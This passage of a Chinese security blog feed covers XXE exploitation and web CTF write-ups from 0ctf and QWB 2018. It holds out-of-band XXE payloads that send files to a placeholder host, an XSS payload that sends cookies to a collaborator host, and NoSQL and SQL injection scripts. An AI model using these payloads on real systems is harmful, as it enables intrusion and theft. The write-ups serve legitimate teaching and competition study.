xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=../../../../index.php"&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % dtd SYSTEM "http://myvps.com/file.dtd"&gt;</span></span><br><span class="line"><span class="meta">%dtd; %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>myvps.com/file.dtd<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://myvps.com/?q=%file;'&gt;"&gt;</span><br></pre></td></tr></table></figure></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY data SYSTEM "http://127.0.0.1:8080"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;data;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line">或者</span><br><span class="line">libxml2.9.0以后默认不开启外部实体引用，gameover</span><br></pre></td></tr></table></figure><h3 id="Java-xxe-漏洞利用"><a href="#Java-xxe-漏洞利用" class="headerlink" title="Java xxe 漏洞利用"></a>Java xxe 漏洞利用</h3><h4 id="列目录"><a href="#列目录" class="headerlink" title="列目录"></a>列目录</h4><p>Java xxe 可以列目录</p><p>发送的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://myvps.com/dir.dtd"&gt;%remote;]&gt;</span></span><br></pre></td></tr></table></figure><p>myvps.com/dir.dtd</p><p>file:///etc/passwd</p><p>file:///c:///windows/win.ini</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % a SYSTEM "file:///"&gt; &lt;!ENTITY % b "&lt;!ENTITY &amp;#37; c SYSTEM 'gopher://myvps.com:9000/%a;'&gt;"&gt; %b; %c;</span><br></pre></td></tr></table></figure><p>myvps.com上运行nc监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -klvvp 9000</span><br></pre></td></tr></table></figure><p>除了gopher协议，还常用ftp协议、http协议</p><h3 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><h3 id="简化利用方式"><a href="#简化利用方式" class="headerlink" title="简化利用方式"></a>简化利用方式</h3><p><a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">xxer</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">usage: xxer [-h] [-v] [-q] [-p HTTP] [-P FTP] -H HOSTNAME [-d DTD]</span><br><span class="line"></span><br><span class="line">XXE Injection Handler</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -v, --version         show program&apos;s version number and exit</span><br><span class="line">  -q, --quiet           surpress extra output</span><br><span class="line">  -p HTTP, --http HTTP  HTTP server port</span><br><span class="line">  -P FTP, --ftp FTP     FTP server port</span><br><span class="line">  -H HOSTNAME, --hostname HOSTNAME</span><br><span class="line">                        Hostname of this server</span><br><span class="line">  -d DTD, --dtd DTD     the location of the DTD template. client_file</span><br><span class="line">                        templates allow the filename to be specified by the</span><br><span class="line">                        XXE payload instead of restarting the server</span><br><span class="line"></span><br><span class="line">Originally from https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-</span><br><span class="line">server.rb, rewritten in Python by TheTwitchy</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python xxer.py -P 2121 -d ftp.client_file.dtd.template -H yourvps.com</span><br><span class="line"></span><br><span class="line"> _ _ _ _ ___ ___</span><br><span class="line">|_&apos;_|_&apos;_| -_|  _|</span><br><span class="line">|_,_|_,_|___|_|</span><br><span class="line"></span><br><span class="line">version 1.1</span><br><span class="line"></span><br><span class="line">info: Old DTD found. This file is going to be deleted.</span><br><span class="line">info: Generating new DTD file.</span><br><span class="line">info: Starting xxer_httpd on port 8080</span><br><span class="line">info: Starting xxer_ftpd on port 2121</span><br><span class="line">info: Servers started. Use the following payload (with URL-encoding):</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM &quot;http://yourvps.com:8080/ext.dtd&quot;&gt;&lt;!ENTITY % bbb SYSTEM &quot;file:///&quot;&gt;%aaa;%ccc;%ddd;]&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf-ctf-2018</title>
      <link href="//blog/2018/0ctf-ctf-2018.html"/>
      <url>//blog/2018/0ctf-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h3 id="Login-me"><a href="#Login-me" class="headerlink" title="Login me"></a>Login me</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hi, I&apos;ve been learning NodeJS for a day!!!</span><br><span class="line">I&apos;m trying to make a simple login page with this awesome language, can you please check it out.</span><br></pre></td></tr></table></figure><p>源码在此<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> app = express()</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> path    = <span class="built_in">require</span>(<span class="string">"path"</span>);</span><br><span class="line"><span class="keyword">var</span> moment = <span class="built_in">require</span>(<span class="string">'moment'</span>);</span><br><span class="line"><span class="keyword">var</span> MongoClient = <span class="built_in">require</span>(<span class="string">'mongodb'</span>).MongoClient;</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">"mongodb://localhost:27017/"</span>;</span><br><span class="line"></span><br><span class="line">MongoClient.connect(url, <span class="function"><span class="keyword">function</span>(<span class="params">err, db</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    dbo = db.db(<span class="string">"test_db"</span>);</span><br><span class="line">    <span class="keyword">var</span> collection_name = <span class="string">"users"</span>;</span><br><span class="line">    <span class="keyword">var</span> password_column = <span class="string">"password_"</span>+<span class="built_in">Math</span>.random().toString(<span class="number">36</span>).slice(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">var</span> password = <span class="string">"XXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">    <span class="comment">// flag is flag&#123;password&#125;</span></span><br><span class="line">    <span class="keyword">var</span> myobj = &#123; <span class="string">"username"</span>: <span class="string">"admin"</span>, <span class="string">"last_access"</span>: moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss Z'</span>)&#125;;</span><br><span class="line">    myobj[password_column] = password;</span><br><span class="line">    dbo.collection(collection_name).remove(&#123;&#125;);</span><br><span class="line">    dbo.collection(collection_name).update(</span><br><span class="line">        &#123; <span class="attr">name</span>: myobj.name &#125;,</span><br><span class="line">        myobj,</span><br><span class="line">        &#123; <span class="attr">upsert</span>: <span class="literal">true</span> &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        res.sendFile(path.join(__dirname,<span class="string">'index.html'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">    app.post(<span class="string">'/check'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> check_function = <span class="string">'if(this.username == #username# &amp;&amp; #username# == "admin" &amp;&amp; hex_md5(#password#) == this.'</span>+password_column+<span class="string">')&#123;\nreturn 1;\n&#125;else&#123;\nreturn 0;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> req.body)&#123;</span><br><span class="line">            <span class="keyword">var</span> valid = [<span class="string">'#'</span>,<span class="string">'('</span>,<span class="string">')'</span>].every(<span class="function">(<span class="params">x</span>)=&gt;</span>&#123;<span class="keyword">return</span> req.body[k].indexOf(x) == <span class="number">-1</span>&#125;);</span><br><span class="line">            <span class="keyword">if</span>(!valid) res.send(<span class="string">'Nope'</span>);</span><br><span class="line">            check_function = check_function.replace(</span><br><span class="line">                <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">'#'</span>+k+<span class="string">'#'</span>,<span class="string">'gm'</span>)</span><br><span class="line">                ,<span class="built_in">JSON</span>.stringify(req.body[k]))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> query = &#123;<span class="string">"$where"</span> : check_function&#125;;</span><br><span class="line">        <span class="keyword">var</span> newvalue = &#123;<span class="attr">$set</span> : &#123;<span class="attr">last_access</span>: moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss Z'</span>)&#125;&#125;</span><br><span class="line">        dbo.collection(collection_name).updateOne(query,newvalue,<span class="function"><span class="keyword">function</span> (<span class="params">e,r</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(e) <span class="keyword">throw</span> e;</span><br><span class="line">            res.send(<span class="string">'ok'</span>);</span><br><span class="line">            <span class="comment">// ... implementing, plz dont release this.</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    app.listen(<span class="number">8081</span>)</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>重点在于<code>new RegExp(&#39;#&#39;+k+&#39;#&#39;,&#39;gm&#39;)</code> 替换那里。</p><p>前面有个检测，</p><blockquote><p>var valid = [‘#’,’(‘,’)’].every((x)=&gt;{return req.body[k].indexOf(x) == -1});</p></blockquote><p>可以通过传数组绕过。</p><p>比如传</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[]=a#dmin&amp;password=123</span><br></pre></td></tr></table></figure><p>则，<code>req.body[k]</code> 获取到的是一个数组，username[0]=”a#dmin”，所以，<code>.indexOf(&#39;#&#39;)==-1</code> 是可以通过检测的。</p><p>然后，构造注入语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+%26%26+[]=# || 1==1)&#123; if(JSON.stringify(this)[0]==&apos;&#123;&apos;)&#123;sleep(10000)&#125;  &#125;else if(1)&#123;//&amp;username%5C%5B%22=admin&amp;password=456</span><br></pre></td></tr></table></figure><p>替换前</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == #username# &amp;&amp; #username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.password_6y0a9vnxsbgmequyja5c9885mi)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return 0;&#125;</span><br></pre></td></tr></table></figure><p>用<code>[&quot;# || 1==1){ if(JSON.stringify(this)[0]==&#39;{&#39;){sleep(10000)}  }else if(1){//&quot;]</code> 替换 <code># &amp;&amp; #</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == #username[&quot;# || 1==1)&#123; if(JSON.stringify(this)[0]==&apos;&#123;&apos;)&#123;sleep(10000)&#125;  &#125;else if(1)&#123;//&quot;]username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.password_6y0a9vnxsbgmequyja5c9885mi)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return 0;&#125;</span><br></pre></td></tr></table></figure><p>用 <code>&quot;admin&quot;</code> 替换 <code>#username[&quot;#</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(this.username == &quot;admin&quot; || 1==1)&#123; if(JSON.stringify(this)[0]==&apos;&#123;&apos;)&#123;sleep(10000)&#125;  &#125;else if(1)&#123;//&quot;]username# == &quot;admin&quot; &amp;&amp; hex_md5(#password#) == this.password_6y0a9vnxsbgmequyja5c9885mi)&#123;</span><br><span class="line">return 1;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">return 0;&#125;</span><br></pre></td></tr></table></figure><p>可以看到中间一段代码是我们可控的了。</p><p>写脚本时间盲注。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> OrderedDict</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://202.120.7.194:8082/check"</span></span><br><span class="line"></span><br><span class="line">guess = string.lowercase + string.uppercase + string.digits + string.punctuation + <span class="string">" "</span></span><br><span class="line"><span class="comment"># proxies = &#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line">proxies = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url,data)</span>:</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r = requests.post(url = url,data = data,proxies=proxies,timeout=<span class="number">6</span>)</span><br><span class="line"><span class="keyword">except</span> Exception, e:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">results = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">99</span>,<span class="number">250</span>):</span><br><span class="line">result = <span class="string">" "</span></span><br><span class="line"><span class="keyword">for</span> g <span class="keyword">in</span> guess:</span><br><span class="line">print(<span class="string">"%d -&gt; %s"</span>%(d,g))</span><br><span class="line">data = OrderedDict()</span><br><span class="line">data[<span class="string">' &amp;&amp; []'</span>] = <span class="string">"# || 1==1)&#123; if(JSON.stringify(this)[%d]=='%s')&#123;sleep(10000)&#125;  &#125;else if(1)&#123;//"</span>%(d,g)</span><br><span class="line">data[<span class="string">"username\[\""</span>] = <span class="string">"admin"</span></span><br><span class="line">data[<span class="string">"password"</span>]  = <span class="string">"456"</span></span><br><span class="line"><span class="keyword">if</span>(check(url=url,data=data)):</span><br><span class="line">result = g</span><br><span class="line">print(result)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">print(result)</span><br><span class="line">results += result</span><br><span class="line">print(<span class="string">"results is -&gt; : "</span> + results)</span><br><span class="line">print(<span class="string">"results is -&gt; : "</span> + results)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>强网杯-ctf-2018</title>
      <link href="//blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html"/>
      <url>//blog/2018/%E5%BC%BA%E7%BD%91%E6%9D%AF-ctf-2018.html</url>
      
        <content type="html"><![CDATA[<h2 id="web-签到"><a href="#web-签到" class="headerlink" title="web 签到"></a>web 签到</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">if($_POST[&apos;param1&apos;]!=$_POST[&apos;param2&apos;] &amp;&amp; md5($_POST[&apos;param1&apos;])==md5($_POST[&apos;param2&apos;]))&#123;</span><br><span class="line">die(&quot;success!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>md5碰撞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%87%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25qAZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BD%F2%807%3C%5B%96%0B%1D%D1%DCA%7B%9C%E4%D8%97%F4ZeU%D55s%9A%C7%F0%EB%FD%0C0%29%F1f%D1%09%B1%8Fu%27%7Fy0%D5%5C%EB%22%E8%AD%BAy%CC%15%5C%EDt%CB%DD_%C5%D3m%B1%9B%0A%D85%CC%A7%E3&amp;param2=%D11%DD%02%C5%E6%EE%C4i%3D%9A%06%98%AF%F9%5C%2F%CA%B5%07%12F%7E%AB%40%04X%3E%B8%FB%7F%89U%AD4%06%09%F4%B3%02%83%E4%88%83%25%F1AZ%08Q%25%E8%F7%CD%C9%9F%D9%1D%BDr%807%3C%5B%96%0B%1D%D1%DCA%7B%9C%E4%D8%97%F4ZeU%D55s%9AG%F0%EB%FD%0C0%29%F1f%D1%09%B1%8Fu%27%7Fy0%D5%5C%EB%22%E8%AD%BAyL%15%5C%EDt%CB%DD_%C5%D3m%B1%9B%0AX5%CC%A7%E3</span><br></pre></td></tr></table></figure><p>提交三次就能够拿到flag了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">success! flag is QWB&#123;s1gns1gns1gnaftermd5&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/qwb2018/1.png" alt=""></p><h2 id="Share-your-mind"><a href="#Share-your-mind" class="headerlink" title="Share your mind"></a>Share your mind</h2><p>Orz,一开始发现了report页面的那个xss，然后发现拿不到cookie，然后各种迷。</p><p>后来，发现存在RPO问题。</p><p>首先，Write your ideas那里写个javascript代码，注意&lt;,&gt;,’,”被编码了。</p><p>如，<a href="http://39.107.33.96:20000/index.php/view/article/632" target="_blank" rel="noopener">http://39.107.33.96:20000/index.php/view/article/632</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert(1);</span><br></pre></td></tr></table></figure><p>访问这个网址可以触发xss</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/632/..%2f..%2f..%2f..%2f</span><br></pre></td></tr></table></figure><p><img src="/img/qwb2018/2.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(119,105,110,100,111,119,46,111,112,101,110,40,34,104,116,116,112,58,47,47,121,112,114,105,108,57,54,118,113,112,113,99,54,119,107,100,56,115,53,57,107,105,104,108,57,99,102,51,51,115,46,98,117,114,112,99,111,108,108,97,98,111,114,97,116,111,114,46,110,101,116,47,99,111,111,107,105,101,46,97,115,112,63,109,115,103,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.107.33.96:20000/index.php/view/article/633/..%2f..%2f..%2f..%2f</span><br></pre></td></tr></table></figure><p>提交这个url拿到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br></pre></td></tr></table></figure><p>构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode(102,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,102,46,115,114,99,61,34,47,81,87,66,95,102,108,52,103,47,81,87,66,47,34,59,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,98,111,100,121,34,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,102,41,59,102,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,110,101,119,32,73,109,97,103,101,40,41,46,115,114,99,61,34,104,116,116,112,58,47,47,99,115,56,119,111,110,57,57,116,51,116,113,57,97,110,114,98,54,56,110,110,119,107,122,99,113,105,106,54,56,46,98,117,114,112,99,111,108,108,97,98,111,114,97,116,111,114,46,110,101,116,47,99,111,111,107,105,101,46,112,104,112,63,109,115,103,61,34,43,102,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59,125));</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=QWB&#123;flag_is_f43kth4rpo&#125;; HINT=Try to get the cookie of path &quot;/QWB_fl4g/QWB/&quot;</span><br></pre></td></tr></table></figure><h2 id="Three-hit"><a href="#Three-hit" class="headerlink" title="Three hit"></a>Three hit</h2><p>很容易发现age那里有注入</p><p>写个脚本跑一波</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: UTF-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line">import uuid</span><br><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">reg_url = &quot;http://39.107.32.29:10000/index.php?func=register&quot;</span><br><span class="line">log_url = &quot;http://39.107.32.29:10000/index.php?func=login&quot;</span><br><span class="line">pro_url = &quot;http://39.107.32.29:10000/profile.php&quot;</span><br><span class="line">cookies = &#123;&quot;PHPSESSID&quot;:&quot;tfu105n7m92qs0d821on4nspo6&quot;&#125;</span><br><span class="line">proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">prefex = str(uuid.uuid1())[0:5]</span><br><span class="line">n = 1</span><br><span class="line">while True:</span><br><span class="line">query = raw_input(&quot;&gt; &quot;)</span><br><span class="line"># query = query.replace(&apos; &apos;,&apos;+&apos;)</span><br><span class="line">query = &quot;1 and 1=2 union select 1,(%s),3,4-- data&quot;%query</span><br><span class="line">query = str(binascii.hexlify(query))</span><br><span class="line"># print query</span><br><span class="line"># break</span><br><span class="line">user = &quot;%s%d&quot;%(prefex, n)</span><br><span class="line">requests.post(url = reg_url,cookies=cookies,data = &#123;&quot;username&quot;:user,&quot;age&quot;:&quot;0x%s&quot;%query,&quot;password&quot;:&quot;hello&quot;&#125;,proxies=proxies)</span><br><span class="line">requests.post(url = log_url, cookies=cookies,data = &#123;&quot;username&quot;:user,&quot;password&quot;:&quot;hello&quot;&#125;,proxies=proxies)</span><br><span class="line">r = requests.get(url = pro_url, cookies=cookies,proxies=proxies)</span><br><span class="line"></span><br><span class="line">m = re.findall(r&apos;whose name is &lt;a&gt;(.*)&lt;/a&gt; is also&apos;,r.content)</span><br><span class="line">for result in m:</span><br><span class="line">print result</span><br><span class="line">n += 1</span><br></pre></td></tr></table></figure><p><img src="/img/qwb2018/3.png" alt=""></p><h2 id="Python-is-the-best-language-1"><a href="#Python-is-the-best-language-1" class="headerlink" title="Python is the best language 1"></a>Python is the best language 1</h2><p>在发say 